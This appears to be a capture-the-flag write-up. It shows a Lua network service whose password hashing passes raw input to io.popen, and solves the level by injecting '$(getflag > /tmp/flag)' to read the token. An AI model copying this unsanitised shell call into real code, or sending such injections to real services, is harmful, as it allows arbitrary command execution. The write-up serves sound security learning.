# At this level we have a lua program which executes some code on port 5151. We can access to with nc:

$> nc 127.0.0.1 5151
Password:

# It asks for a password but I don't have it. Let's take a look in the source code:

$> cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

# The program will take a password, hash it and compare with the good one. To do this, it uses io.popen() which has a huge vulnerability because you can simply inject code into it !

$> nc 127.0.0.1 5151
Password: $(getflag > /tmp/flag)
Erf nope..

$> cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
